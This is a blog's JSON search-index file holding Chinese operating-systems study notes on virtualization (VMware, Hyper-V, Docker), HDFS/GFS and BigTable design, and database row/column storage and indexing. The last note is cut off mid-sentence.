{"meta":{"title":"殇花","subtitle":"殇花思密达","description":"殇花的博客","author":"殇 花","url":"https://www.shanghua.live","root":"/"},"pages":[{"title":"categories","date":"2021-06-20T13:28:52.000Z","updated":"2021-06-20T05:29:03.669Z","comments":true,"path":"categories/index.html","permalink":"https://www.shanghua.live/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-06-20T13:27:36.000Z","updated":"2021-06-20T05:27:54.528Z","comments":true,"path":"tags/index.html","permalink":"https://www.shanghua.live/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-07-08T04:54:59.481Z","updated":"2021-07-08T04:54:59.481Z","comments":true,"path":"js/demo.js","permalink":"https://www.shanghua.live/js/demo.js","excerpt":"","text":"setTimeout(() => { console.log(\"aaa\"); },0)"}],"posts":[{"title":"虚拟化技术介绍","slug":"计操/虚拟化技术介绍","date":"2021-07-27T14:12:28.000Z","updated":"2021-07-27T06:20:01.721Z","comments":true,"path":"2021/07/27/计操/虚拟化技术介绍/","link":"","permalink":"https://www.shanghua.live/2021/07/27/%E8%AE%A1%E6%93%8D/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"都说今天是一个云时代，其实云的本质就是由基础架构提供商提供基础架构，应用开发商不再关心基础架构。我们可以类比人类刚刚发明电的时候，工厂需要自己建电站，而现在只需要电线和插座就可以使用电。 云时代让我们可以在分钟、甚至秒级时间内获得计算、存储、操作系统等资源。设备不再论个卖，而是以一个虚拟化单位售卖，比如： 用户可以买走一个 64 核 CPU 机器中的 0.25 个 CPU； 也可以买走一个 128GB 内存机器中的 512M 内存； 还可以买走 1/2 台机器三个小时了执行时间。 实现以上这些，就需要虚拟化技术。这一讲我将以虚拟化技术中两种最具代表性的设计——VMware 和 Docker，为你解读解虚拟化技术。 什么是“虚拟化”顾名思义，虚拟是相对于现实而言。虚拟化（Virutualization）通常是指构造真实的虚拟版本。不严谨地说，用软件模拟计算机，就是虚拟机；用数字模拟价值，就是货币；用存储空间模拟物理存储，就是虚拟磁盘。 VMware 和 Docker 是目前虚拟化技术中最具代表性的两种设计。VMware 为应用提供虚拟的计算机（虚拟机）；Docker 为应用提供虚拟的空间，被称作容器（Container），关于空间的含义，我们会在下文中详细讨论。 VMware在 1998 年诞生，通过 Hypervisor 的设计彻底改变了虚拟化技术。2005 年，VMware 不断壮大，在全球雇用了 1000 名员工，成为世界上最大的云基础架构提供商。 Docker则是 2013 年发布的一个社区产品，后来逐渐在程序员群体中流行了起来。大量程序员开始习惯使用 Docker，所以各大公司才决定使用它。Kubernates（K8s）容器编排系统，一开始也是将 Docker 作为主要容器。虽然业内不时有传出二者即将分道扬镳的消息，但是目前（2021 年）K8s 下的容器主要还是 Docker。 虚拟机的设计接下来我们说说虚拟机设计。要虚拟一台计算机，要满足三个条件：隔离、仿真、高效。 隔离（Isolation）， 很好理解，指的是一台实体机上的所有的虚拟机实例不能互相影响。这也是早期设计虚拟机的一大动力，比如可以在一台实体机器上同时安装 Linux、Unix、Windows、MacOS 四种操作系统，那么一台实体机器就可以执行四种操作系统上的程序，这就节省了采购机器的开销。 仿真（Simulation）指的是用起来像一台真的机器那样，包括开机、关机，以及各种各样的硬件设备。在虚拟机上执行的操作系统认为自己就是在实体机上执行。仿真主要的贡献是让进程可以无缝的迁移，也就是让虚拟机中执行的进程，真实地感受到和在实体机上执行是一样的——这样程序从虚拟机到虚拟机、实体机到虚拟机的应用迁移，就不需要修改源代码。 高效（Efficient）的目标是减少虚拟机对 CPU、对硬件资源的占用。通常在虚拟机上执行指令需要额外负担 10~15% 的执行成本，这个开销是相对较低的。因为应用通常很少将 CPU 真的用满，在容器中执行 CPU 指令开销会更低更接近在本地执行程序的速度。 为了实现上述的三种诉求，最直观的方案就是将虚拟机管理程序 Hypervisor 作为操作系统，在虚拟机管理程序（Hypervisor）之上再去构建更多的虚拟机。像这种管理虚拟机的架构，也称为 Type-1 虚拟机，如下图所示： 我们通常把虚拟机管理程序（Virtual Machine Monitor，VMM）称为 Hypervisor。在 Type-1 虚拟机中，Hypervisor 一方面作为操作系统管理硬件，另一方面作为虚拟机的管理程序。在 Hypervisor 之上创建多个虚拟机，每个虚拟机可以拥有不同的操作系统（Guest OS）。 二进制翻译通常硬件的设计假定是由单操作系统管理的。如果多个操作系统要共享这些设备，就需要通过 Hypervisor。当操作系统需要执行程序的时候，程序的指令就通过 Hypervisor 执行。早期的虚拟机设计当中，Hypervisor 不断翻译来自虚拟机的程序指令，将它们翻译成可以适配在目标硬件上执行的指令。这样的设计，我们称为二进制翻译。 二进制翻译的弱点在于性能，所有指令都需要翻译。相当于在执行所有指令的时候，都会产生额外的开销。当然可以用动态翻译技术进行弥补，比如说预读指令进行翻译，但是依然会产生较大的性能消耗。 世界切换和虚拟化支持 另一种方式就是当虚拟机上的应用需要执行程序的时候，进行一次世界切换（World Switch）。所谓世界切换就是交接系统的控制权，比如虚拟机上的操作系统，进入内核接管中断，成为实际的机器的控制者。在这样的条件下，虚拟机上程序的执行就变成了本地程序的执行。相对来说，这种切换行为相较于二进制翻译，成本是更低的。 为了实现世界切换，虚拟机上的操作系统需要使用硬件设备，比如内存管理单元（MMR）、TLB、DMA 等。这些设备都需要支持虚拟机上操作系统的使用，比如说 TLB 需要区分是虚拟机还是实体机程序。虽然可以用软件模拟出这些设备给虚拟机使用，但是如果能让虚拟机使用真实的设备，性能会更好。现在的 CPU 通常都支持虚拟化技术，比如 Intel 的 VT-X 和 AMD 的 AMD-V（也称作 Secure Virtual Machine）。如果你对硬件虚拟化技术非常感兴趣，可以阅读这篇文档。https://www.mimuw.edu.pl/~vincent/lecture6/sources/amd-pacifica-specification.pdf Type-2 虚拟机Type-1 虚拟机本身是一个操作系统，所以需要用户预装。为了方便用户的使用，VMware 还推出了 Type-2 虚拟机，如下图所示： 在第二种设计当中，虚拟机本身也作为一个进程。它和操作系统中执行的其他进程并没有太大的区别。但是为了提升性能，有一部分 Hypervisor 程序会作为内核中的驱动执行。当虚拟机操作系统（Guest OS）执行程序的时候，会通过 Hypervisor 实现世界切换。因此，虽然和 Type-1 虚拟机有一定的区别，但是从本质上来看差距不大，同样是需要二进制翻译技术和虚拟化技术。 Hyper-V随着虚拟机的发展，现在也出现了很多混合型的虚拟机，比如微软的 Hyper-v 技术。从下图中你会看到，虚拟机的管理程序（Parent Partition）及 Windows 的核心程序，都会作为一个虚拟化的节点，拥有一个自己的 VMBus，并且通过 Hypervisor 实现虚拟化。 在 Hyper-V 的架构当中不存在一个主的操作系统。实际上，用户开机之后就在使用虚拟机，Windows 通过虚拟机执行。在这种架构下，其他的虚拟机，比如用 VMware 管理的虚拟机也可以复用这套架构。当然，你也可以直接把 Linux 安装在 Hyper-V 下，只不过安装过程没有 VMWare 傻瓜化，其实也是很不错的选择。 容器（Container）虚拟机虚拟的是计算机，容器虚拟的是执行环境。每个容器都是一套独立的执行环境，如下图所示，容器直接被管理在操作系统之内，并不需要一个虚拟机监控程序。 和虚拟机有一个最大的区别就是：容器是直接跑在操作系统之上的，容器内部是应用，应用执行起来就是进程。这个进程和操作系统上的其他进程也没有本质区别，但这个架构设计没有了虚拟机监控系统。当然，容器有一个更轻量级的管理程序，用户可以从网络上下载镜像，启动起来就是容器。容器中预装了一些程序，比如说一个 Python 开发环境中，还会预装 Web 服务器和数据库。因为没有了虚拟机管理程序在中间的开销，因而性能会更高。而且因为不需要安装操作系统，因此容器安装速度更快，可以达到 ms 级别。 容器依赖操作系统的能力直接实现，比如： Linux 的 Cgroups（Linux Control Groups）能力，可以用来限制某组进程使用的 CPU 资源和内存资源，控制进程的资源能使用； 另外Linux 的 Namespace 能力，可以设置每个容器能看到能够使用的目录和文件。 有了这两个能力，就可以基本控制容器间的隔离，容器中的应用直接以进程的身份执行即可。进程间的目录空间、 CPU 资源已经被隔离了，所以不用担心互相影响。 总结这一讲我们学习了 VMware 虚拟机和 Docker 容器的一些基本设计思路。虚拟机可以把一个完整的系统用若干个文件保存下来，因此迁移和复制都很容易。但是，与其启动一个操作系统，还不如直接打开应用，因此以 Docker 为代表的容器逐渐发展了起来。 容器虽然达到了虚拟机同样的隔离性，创建、销毁、维护成本都更低，但是从安全性考虑，还是要优先选用虚拟机执行操作系统。基础设施是一件大事，比如操作系统会发生故障、任何应用都有可能不安全，甚至容器管理程序本身也可能出现问题。因此，现在更多的情况是 Docker 被安装到了虚拟机上。 那么通过这一讲的学习，你现在可以尝试来回答本讲关联的面试题目：VMware 和 Docker 的区别？ 【解析】 VMware 提供虚拟机，Docker 提供容器。 虚拟机是一台完整的计算机，因此需要安装操作系统。虚拟机中的程序执行在虚拟机的操作系统上，为了让多个操作系统可以高效率地同时执行，虚拟机非常依赖底层的硬件架构提供的虚拟化能力。容器则是利用操作系统的能力直接实现隔离，容器中的程序可以以进程的身份直接执行。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"HDFS 介绍","slug":"计操/HDFS介绍","date":"2021-07-26T11:58:48.000Z","updated":"2021-07-26T07:08:18.950Z","comments":true,"path":"2021/07/26/计操/HDFS介绍/","link":"","permalink":"https://www.shanghua.live/2021/07/26/%E8%AE%A1%E6%93%8D/HDFS%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"前面我们学习了单机文件系统、数据库索引的设计，这一讲我们讨论大数据环境下的数据管理——分布式文件系统和分布式数据库。分布式文件系统通过计算机网络连接大量物理节点，将不同机器、不同磁盘、不同逻辑分区的数据组织在一起，提供海量的数据存储（一般是 Petabytes 级别，1PB = 1024TB）。分布式数据库则在分布式文件系统基础上，提供应对具体场景的海量数据解决方案。 说起大数据，就不得不提历史上在存储领域影响深远的两篇 Paper。 Google File System BigTable：A Distributed Storage System for Structured Data Google File System 是一个分布式文件系统，构成了今天大数据生态的底层存储，也是我们本讲主角 HDFS 的原型。HDFS（Hadoop Distributed File System）是 Google File System 的一个重要实现。 后者 BigTable 是一个分布式数据库。BigTable 本身是 Google 内部的项目，建立在 Google File System 之上，为 Google 的搜索引擎提供数据支撑。它是 2005 年公布的第一个版本，而且通过 Paper 公布了实现，在那个大数据还处于萌芽阶段的时代，BigTable 成为了启明星，今天我们常用的 HBase 还沿用着 BigTable 的设计。 因为两个重量级的 Paper 都是 Google 的产物，所以这一讲，我会结合搜索引擎的设计，带你走进分布式存储和数据库的世界。 存储所有的网页作为搜索引擎最核心的一个能力，就是要存储所有的网页。目前世界上有 20 多亿个网站，每个网站还有大量的页面。搜索引擎不单单要存下这些页面，而且搜索引擎还需要存储这些网页的历史版本。 这里请你思考下，网站所有页面加起来有多大？举个例子，豆瓣所有页面加起来会有多大？如果把所有的变更都算上，比如一张页面经过 200 次迭代，就存 200 份，那么需要多少空间？Google 要把这些数据都存储下来，肯定是 PB 级别的数据。而且这个庞大的数据还需要提供给 Google 内部的分布式计算引擎等去计算，为网站打分、为用户生成索引，如果没有强大的存储能力是做不到的。 模型的选择我们先来思考应该用何种模型存下这个巨大的网页表。 网页的历史版本，可以用 URL+ 时间戳进行描述。但是为了检索方便，网页不仅有内容，还有语言、外链等。在存储端可以先不考虑提供复杂的索引，比如说提供全文搜索。但是我们至少应该提供合理的数据读写方式。 网页除了内容，还有外链，外链就是链接到网页的外部网站。链接到一个网站的外链越多，那就说明这个网站在互联网中扮演的角色越重要。Google 创立之初就在基于外链的质量和数量为网站打分。外链可能是文字链接、图片链接等，因此外链也可以有版本，比如外链文本调整了，图片换了。除了外链还有标题、Logo，也需要存储。其实要存储的内容有很多，我不一一指出了。 我们先看看行存储，可不可以满足需求。比如每个网页（ URL） 的数据是一行。 看似这个方案可行，可惜列不是固定。比如外链可能有很多个，如下表： 列不固定，不仅仅是行的大小不好确定，而是表格画不出来。何况每一列内容还可能有很多版本，不同版本是搜索引擎的爬虫在不同时间收录的内容，再加上内容本身也很大，有可能一个磁盘 Block 都存不下。看来行存储困难重重。 那么列存储行不行呢？ 当然不行，我们都不确定到底有多少列？ 有的网站有几千个外链，有的一个都没有，外链到底用多少列呢？ 所以上表只可以作为我们存储设计的一个逻辑概念——这种逻辑概念在设计系统的时候，还有一个名词，叫作领域语言。领域语言是我们的思考方式，从搜索引擎的职责上讲，数据需要按照上面的结构聚合。况且根据 URL 拿数据，这是必须提供的能力。但是底层如何持久化，还需要进一步思考。 因为列是不确定的，这种情况下只能考虑用 Key-Value 结构，也就是 Map 存储。Map 是一种抽象的数据结构，本质是 Key-Value 数据的集合。 作为搜索引擎的支撑，Key 可以考虑设计为 &lt;URL, Column，时间戳&gt; 的三元组，值就是对应版本的数据。 列名（Column）可以考虑分成两段，用:分隔开。列名包括列家族（Family) 、列标识（Qualifier）。这样设计是因为有时候多个列描述的是相似的数据，比如说外链（Anchor），就是一个列家族。然后百度、搜狐是外链家族的具体的标识（Qualifier）。比如来自百度页面 a 外链的列名是anchor:baidu.com/a。分成家族还有一个好处就是权限控制，比如不同部门的内部人员可以访问不同列家族的数据。当然有的列家族可能只有一个列，比如网页语言；有的列家族可能有很多列，比如外链。 接下来，我们思考：这个巨大的 Map（Key-Value）的集合应该用什么数据结构呢？——数组？链表？树？哈希表？ 小提示：Map 只是 Key-Value 的集合。并没有约定具体如何实现，比如 HashMap 就是用哈希表实现 Map，ArrayMap 就是用数组实现 Map。LinkedMap 就是用链表实现 Map。LinkedJumpMap 就是用跳表实现 Map…… 考虑到一行的数据并不会太大，我们可以用 URL 作为行的索引。当用户想用 Key 查找 Value 时，先使用 Key 中 URL 帮用户找到完整的行。这里可以考虑使用上一讲学习的 B+ 树去存储所有的 URL，建立一个 URL 到行号的索引。你看看，知识总是被重复利用，再次证明了人类的本质是复读机，其实就是学好基础很重要。通过 B+ 树，这样即便真的有海量的数据，也可以在少数几次、几十次查询内完成找到 URL 对应的数据。况且，我们还可以设计缓存。 B+ 树需要一种顺序，比较好的做法是 URL 以按照字典序排列。这是因为，相同域名的网页资源同时被用到的概率更高，应该安排从物理上更近，尽量把相同域名的数据放到相邻的存储块中（节省磁盘操作）。 那么行内的数据应该如何存储呢？可以考虑分列存储。那么行内用什么数据结构呢？如果列非常多，也可以考虑继续用 B+ 树。还有一种设计思路，是先把大表按照行拆分，比如若干行形成一个小片称作 Tablet，然后 Tablet 内部再使用列存储，这个设计我们会在后面一点讨论。 查询和写入当客户端查询的时候，请求参数中会包含 &lt;URL, 列名&gt;，这个时候我们可以通过 B+ 树定位到具体的行（也就是 URL 对应的数据）所在的块，再根据列名找到具体的列。然后，将一列数据导入到内存中，最后在内存中找到对应版本的数据。 客户端写入时，也是按照行→列的顺序，先找到列，再在这一列最后面追加数据。 对于修改、删除操作可以考虑不支持，因为所有的变更已经记录下来了。 分片（Tablet）的抽象上面我们提到了可以把若干行组合在一起存储的设计。这个设计比较适合数据在集群中分布。假设存储网页的表有几十个 PB，那么先水平分表，就是通过 行（URL） 分表。URL 按照字典排序，相邻的 URL 数据从物理上也会相近。水平分表的结果，字典序相近的行（URL）数据会形成分片（Tablet），Tablet 这个单词类似药片的含义。 如上图所示：每个分片中含有一部分的行，视情况而定。分片（Tablet），可以作为数据分布的最小单位。分片内部可以考虑图上的行存储，也可以考虑内部是一个 B+ 树组织的列存储。 为了实现分布式存储，每个分片可以对应一个分布式文件系统中的文件。假设这个分布式文件系统接入了 Linux 的虚拟文件系统，使用和操作会同 Linux 本地文件并无二致。其实不一定会这样实现，这只是一个可行的方案。 为了存储安全，一个分片最少应该有 2 个副本，也就是 3 份数据。3 份数据在其中一份数据不一致后，可以对比其他两份的结果修正数据。这 3 份数据，我们不考虑跨数据中心。因为跨地域成本太高，吞吐量不好保证，假设它们还在同一地域的机房内，只不过在不同的机器、磁盘上。 块（Chunk）的抽象比分片更小的单位是块（Chunk），这个单词和磁盘的块（Block）区分开。Chunk 是一个比 Block 更大的单位。Google File System 把数据分成了一个个 Chunk，然后每个 Chunk 会对应具体的磁盘块（Block）。 如下图，Table 是最顶层的结构，它里面含有许多分片（Tablets）。从数据库层面来看，每个分片是一个文件。数据库引擎维护到这个层面即可，至于这个文件如何在分布式系统中工作，就交给底层的文件系统——比如 Google File System 或者 Hadoop Distributed File System。 分布式文件系统通常会在磁盘的 Block 上再抽象一层 Chunk。一个 Chunk 通常比 Block 大很多，比如 Google File System 是 64KB，而通常磁盘的 Block 大小是 4K；HDFS 则是 128MB。这样的设计是为了减少 I/O 操作的频率，分块太小 I/O 频率就会上升，分块大 I/O 频率就减小。 比如一个 Google 的爬虫积攒了足够多的数据再提交到 GFS 中，就比爬虫频繁提交节省网络资源。 分布式文件的管理接下来，我们来讨论一个完整的分布式系统设计。和单机文件系统一样，一个文件必须知道自己的数据（Chunk）存放在哪里。下图展示了一种最简单的设计，文件中包含了许多 Chunk 的 ID，然后每个 ChunkID 可以从 Chunk 的元数据中找到 Chunk 对应的位置。 如果 Chunk 比较大，比如说 HDFS 中 Chunk 有 128MB，那么 1PB 的数据需要 8,388,608 个条目。如果每个条目用 64bit 描述，也就是 8 个字节，只需要 64M 就可以描述清楚。考虑到一个 Chunk 必然会有冗余存储，也就是多个位置，实际会比 64M 多几倍，但也不会非常大了。 因此像 HDFS 和 GFS 等，为了简化设计会把所有文件目录结构信息，加上 Chunk 的信息，保存在一个单点上，通常称为 Master 节点。 下图中，客户端想要读取/foo/bar中某个 Chunk 中某段内容（Byterange）的数据，会分成 4 个步骤： 客户端向 Master 发送请求，将想访问的文B件名、Chunk 的序号（可以通过 Chunk 大小和内容位置计算）； Master 响应请求，返回 Chunk 的地址和 Chunk 的句柄（ID）； 客户端向 Chunk 所在的地址（一台 ChunkServer）发送请求，并将句柄（ID）和内容范围（Byterange）作为参数； ChunkServer 将数据返回给客户端。 在上面这个模型中，有 3 个实体。 客户端（Client）或者应用（Application），它们是数据的实际使用方，比如说 BigTable 数据库是 GFS 的 Client。 Master 节点，它存储了所有的文件信息、Chunk 信息，权限信息等。 ChunkServer 节点，它存储了实际的 Chunk 数据。 Master 只有一台，ChunkServer 可以有很多台。上图中的 namespace 其实就是文件全名（含路径）的集合。Chunk 的 namespace 存储的是含文件全名 + ChunkLocation + ChunkID 的组合。文件的命名空间、Chunk 的命名空间，再加上文件和 Chunk 的对应关系，因为需要频繁使用，可以把它们全部都放到 Master 节点的内存中，并且利用 B 树等在内存中创建索引结构。ChunkServer 会和 Master 保持频繁的联系，将自己的变更告知 Master。这样就构成了一个完整的过程。 读和写读取文件的过程需要两次往返（Round Trip），第一次是客户端和 Master 节点，第二次是客户端和某个 ChunkServer。 写入某个 Chunk 的时候，因为所有存储了这个 Chunk 的服务器都需要更新，所以需要将数据推送给所有的 ChunkServer。这里 GFS 设计中使用了一个非常巧妙的方案，先由客户端将数据推送给所有 ChunkServer 并缓存，而不马上更新。直到所有 ChunkServer 都收到数据后，再集中更新。这样的做法减少了数据不一致的时间。 下图是具体的更新步骤： 客户端要和服务器签订租约，得到一个租期（Lease）。其实就是 Chunk 和 Chunk 所有复制品的修改权限。如果一个客户端拿到租期，在租期内，其他客户端能不能修改这个 Chunk。 Master 告诉客户端该 Chunk 所有的节点位置。包括 1 台主节点（Primary）和普通节点（Secondary）。当然主节点和普通节点，都是 ChunkServer。主 ChunkServer 的作用是协助更新所有从 ChunkServer 的数据。 这一步是设计得最巧妙的地方。客户端接下来将要写入的数据同时推送给所有关联的 ChunkServer。这些 ChunkServer 不会更新数据，而是把数据先缓存起来。 图中的所有 ChunkServer 都收到了数据，并且给客户端回复后，客户端向主 ChunkServer 请求写入。 主 ChunkServer 通知其他节点写入数据。因为数据已经推送过来了，所以这一步很快完成。 写入完数据的节点，所有节点给主 ChunkServer 回复。 主 ChunkServer 通知客户端成功。 以上，就是 GFS 的写入过程。这里有个规律，实现强一致性（所有时刻、所有客户端读取到的数据是一致的）就需要停下所有节点的工作牺牲可用性；或者牺牲分区容错性，减少节点。GFS 和 HDFS 的设计，牺牲的是一致性本身，允许数据在一定时间范围内是不一致的，从而提高吞吐量。 容灾在 HDFS 设计中，Master 节点也被称为 NameNode，用于存储命名空间数据。ChunkServer 也被称为 DataNode，用来存储文件数据。在 HDFS 的设计中，还有一个特殊的节点叫作辅助节点（Secondary Node）。辅助节点本身更像一个客户端，它不断和 NameNode 交流，并把 NameNode 最近的变更写成日志，存放到 DataNode 中。类似日志文件系统，每过一段时间，在 HDFS 中这些日志会形成一个还原点文件，这个机制和上一讲我们提到的日志文件系统类似。如果 Master 节点发生了故障，就可以通过这些还原点进行还原。 其他在分布式文件系统和分布式数据库的设计中，还有很多有趣的知识，比如缓存的设计、空间的回收。如果你感兴趣，你可以进一步阅读我开篇给出的两篇论文。 Google File System BigTable：A Distributed Storage System for Structured Data 总结现在，我们已经可以把所有的场景都串联起来。Google 需要的是一个分布式数据库，存储的数据是包括内容、外链、Logo、标题等在内的网页的全部版本和描述信息。为了描述这些信息，一台机器磁盘不够大，吞吐量也不够大。因此 Google 需要将数据分布存储，将这个大表（BigTable）拆分成很多小片（Tablet）。当然，这并不是直接面向用户的架构。给几十亿用户提供高效查询，还需要分布式计算，计算出给用户使用的内容索引。 Google 团队发现将数据分布出去是一个通用需求。不仅仅是 BigTable 数据库需要，很多其他数据库也可以在这个基础上构造。按照软件设计的原则，每个工具应该尽可能的专注和简单， Google 的架构师意识到需要一个底层的文件系统，就是 Google File System。这样，BigTable 使用 Tablet 的时候，只需要当成文件在使用，具体的分布式读写，就交给了 GFS。 后来，Hadoop 根据 GFS 设计了 Hadoop 分布式文件系统，用于处理大数据，仍然延续了整个 GFS 的设计。 以上，是一个完整的，分布式数据库、分布式存储技术的一个入门级探讨。 那么通过这节课的学习，你现在可以尝试来回答本节关联的面试题目：分布式文件系统是怎么回事？ 【解析】分布式文件系统通过网络将不同的机器、磁盘、逻辑分区等存储资源利用起来，提供跨平台、跨机器的文件管理。通过这种方式，我们可以把很多相对廉价的服务器组合起来形成巨大的存储力量。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"数据库文件系统实例","slug":"计操/数据库文件系统实例","date":"2021-07-26T09:42:18.000Z","updated":"2021-08-07T09:16:22.109Z","comments":true,"path":"2021/07/26/计操/数据库文件系统实例/","link":"","permalink":"https://www.shanghua.live/2021/07/26/%E8%AE%A1%E6%93%8D/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E4%BE%8B/","excerpt":"","text":"B 树和 B+ 树是两种数据结构（关于它们的名字为什么以 B 开头，因为众说纷纭，本讲我就不介绍了），构建了磁盘中的高速索引结构，因此不仅 MySQL 在用，MongoDB、Oracle 等也在用，基本属于数据库的标配常规操作。 数据库要经常和磁盘与内存打交道，为了提升性能，通常需要自己去构建类似文件系统的结构。这一讲的内容有限，我只是先带你入一个门，如果你感兴趣后续可以自己深入学习。下面我们一起来探讨数据库如何利用磁盘空间设计索引。 行存储和列存储在学习构建磁盘数据的索引结构前，我们先通过行存储、列存储的学习来了解一些基本的存储概念，帮助你建立一个基本的认知。 目前数据库存储一张表格主要是行存储（Row Storage）和列存储（Column Storage）两种存储方式。行存储将表格看作一个个记录，每个记录是一行。以包含订单号、金额、下单时间 3 项的表为例，行存储如下图所示： 如上图所示，在计算机中没有真正的行的概念。行存储本质就是数据一个接着一个排列，一行数据后面马上跟着另一行数据。如果订单表很大，一个磁盘块（Block）存不下，那么实际上就是每个块存储一定的行数。 类似下图这样的结构： 行存储更新一行的操作，往往可以在一个块（Block）中进行。而查询数据，聚合数据（比如求 4 月份的订单数），往往需要跨块（Block）。因此，行存储优点很明显，更新快、单条记录的数据集中，适合事务。但缺点也很明显，查询慢。 还有一种表格的存储方式是列存储（Column Storage），列存储中数据是一列一列存的。还以订单表为例，如下图所示： 你可以看到订单号在一起、姓名在一起、时间在一起、金额也在一起——每个列的数据都聚集在一起。乍一看这样的结构很低效，比如说你想取出第一条订单，需要取第 1 列的第 1 个数据1001，然后取第 2 列的第 1 个数据小明，以此类推，需要 4 次磁盘读取。特别是更新某一条记录的时候，需要更新多处，速度很慢。那么列存储优势在哪里呢？优势其实是在查询和聚合运算。 在列存储中同一列数据总是存放在一起，比如要查找某个时间段，很有可能在一个块中就可以找到，因为时间是集中存储的。假设磁盘块的大小是 4KB，一条记录是 100 字节， 那么 4KB 可以存 40 条记录；但是存储时间戳只需要一个 32 位整数，4KB 可以存储 1000 个时间。更关键的是，我们可以把一片连续的硬盘空间通过 DMA 技术直接映射到内存，这样就大大减少了搜索需要的时间。所以有时候在行存储需要几分钟的搜索操作，在列存储中只需几秒钟就可以完成。 总结一下，行存储、列存储，最终都需要把数据存到磁盘块。行存储记录一个接着一个，列存储一列接着一列。前面我们提到行存储适合更新及事务处理，更新好理解，因为一个订单可以在相同的 Block 中更新，那么为什么适合事务呢？ 其实适合不适合是相对的，说行存储适合是因为列存储非常不适合事务。试想一下，你更新一个表的若干个数据，如果要在不同块中更新，就可能产生多次更新操作。更新次数越多，保证一致性越麻烦。在单机环境我们可以上锁，可以用阻塞队列，可以用屏障……但是分布式场景中保证一致性（特别是强一致性）开销很大。因此我们说行存储适合事务，而列存储不适合。 索引接下来，我们在行存储、列存储的基础上，讨论如何创建一些更高效的查询结构，这种结构通常称为索引。我们经常会遇到根据一个订单编号查订单的情况，比如说select * from order where id=1000000，这个时候就需要用到索引。而下面我将试图通过二分查找的场景，和你一起讨论索引是什么。 在亿级的订单 ID 中查找某个编号，很容易想到二分查找。要理解二分查找，最需要关心的是算法的进步机制。这个算法每进行一次查找，都会让问题的规模减半。当然，也有场景限制，二分查找只能应用在排序好的数据上。 比如我们要在下面排序好的数组中查找 3： 11,3,5,8,11,12,15,19,21,25 数组中一共有 10 个元素，因此我们第一次查找从数组正中间的元素找起。如果数组正中间有两个元素，就取左边的那个——对于这个例子是 11。我们比较 11 和 3 的值，因为 11 大于 3，因此可以排除包括 11 在内的所有 11 右边的元素。相当于我们通过一次运算将数据的规模减半。假设我们有 240 （1T 数据）个元素需要查询（规模已经相当大了，万亿级别），用二分查找只需要 40 次运算。 所以按照这个思路，我们需要做的是将数据按照订单 ID 排好序，查询的时候就可以应用二分查找了。而且按照二分查找的思路，也可以进行范围查找。比如要查找 [a,b] 之间的数据，可以先通过二分查找找到 a 的序号，再二分找到 b 的序号，两个序号之间的数据就是目标结果。 但是直接在原始数据上排序，我们可能会把数据弄乱，常规做法是设计冗余数据描述这种排序关系——这就是索引。下面我通过一个简单的例子告诉你为什么不能在原始数据上直接排序。 假设我们有一个订单表，里面有订单 ID 和金额。使用列存储做演示如下： 订单 ID 列： 10005 10001 ……订单金额列： 99.00 100.00 …… 可以看到，订单（10001）是第 2 个订单。但是进行排序后，订单（10001）会到第 1 个位置。这样会弄乱订单 ID（10001）和 金额（100.00）对应的关系。 因此我们必须用空间换时间，额外将订单列拷贝一份排序： 10001，2，10005， 1 以上这种专门用来进行数据查询的额外数据，就是索引。索引中的一个数据，也称作索引条目。上面的索引条目一个接着一个，每个索引条目是 &lt;订单 ID, 序号&gt; 的二元组。 如果你考虑是行存储（比如 MySQL），那么依然可以生成上面的索引，订单 ID 和序号（行号）关联。如果有多个索引，就需要创造多个上面的数据结构。如果有复合索引，比如 &lt;订单状态、日期、序号&gt; 作为一个索引条目，其实就是先按照订单状态，再按照日期排序的索引。 所以复合索引，无非就是多消耗一些空间，排序维度多一些。而且你可以看出复合索引和单列索引完全是独立关系，所以我们可以认为每创造一组索引，就创造了一份冗余的数据。也创造了一种特别的查询方式。关于索引还有很多有趣的知识，我们先介绍这些，如果感兴趣可以自己查资料深挖。 接下来，请分析一个非常核心的问题：上面的索引是一个连续的、从小到大的索引，那么应不应该使用这种从小到大排序的索引呢？例如，我们需要查询订单，就事先创建另一个根据订单 ID 从小到大排序的索引，当用户查找某个订单的时候，无论是行存储、还是列存储，我们就用二分查找查询对应的索引条目。这种方式，我们姑且称为线性排序索引——看似很不错的一个方式，但是并不是非常好的一种做法，请看我接下来的讨论。 二叉搜索树线性排序的数据虽然好用，但是插入新元素的时候性能太低。如果是内存操作，插入一个元素，需要将这个元素之后的所有元素后移一位。但如果这个操作发生在磁盘中呢？这必然是灾难性的。因为磁盘的速度比内存慢至少 10-1000 倍，如果是机械硬盘可能慢几十万到百万倍。 所以我们不能用一种线性结构将磁盘排序。那么树呢？ 比如二叉搜索树（Binary Serach Tree）行不行呢？利用磁盘的空间形成一个二叉搜索树，例如将订单 ID 作为二叉搜索树的 Key。 如下图所示，二叉搜索树的特点是一个节点的左子树的所有节点都小于这个节点，右子树的所有节点都大于这个节点。而且，因为索引条目较少，确实可以考虑在查询的时候，先将足够大的树导入内存，然后再进行搜索。搜索的算法是递归的，与二分查找非常类似，每次计算可以将问题规模减半。当然，具体有多少数据可以导入内存，受实际可以使用的内存数量的限制。 在上面的二叉搜索树中，每个节点的数据分成 Key 和 Value。Key 就是索引值，比如订单 ID 创建索引，那么 Key 就是订单 ID。值中至少需要序号（对行存储也就是行号）。这样，如果们想找 18 对应的行，就可以先通过二叉搜索树找到对应的行号，然后再去对应的行读取数据。 二叉搜索树是一个天生的二分查找结构，每次查找都可以减少一半的问题规模。而且二叉搜索树解决了插入新节点的问题，因为二叉搜索树是一个跳跃结构，不必在内存中连续排列。这样在插入的时候，新节点可以放在任何位置，不会像线性结构那样插入一个元素，所有元素都需要向后排列。 那么回到本质问题，在使用磁盘的时候，二叉搜索树是不是一种合理的查询结构？ 当然还不算，因此还需要继续优化我们的算法。二叉搜索树，在内存中是一个高效的数据结构。这是因为内存速度快，不仅可以随机存取，还可以高频操作。注意 CPU 缓存的穿透率只有 5% 左右，也就是 95% 